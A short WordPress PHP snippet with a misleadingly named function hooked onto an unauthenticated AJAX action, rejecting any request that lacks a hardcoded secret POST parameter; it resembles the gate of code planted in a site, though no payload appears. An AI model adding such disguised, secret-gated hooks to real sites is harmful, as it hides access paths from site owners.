<?php

function logger_analytics_pro_tinymce() {
	if (!isset($_POST["drstsezgxycxv"]) || $_POST["drstsezgxycxv"] !== "hQhgcJlvytKpvip") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'logger_analytics_pro_tinymce', 5, 1);
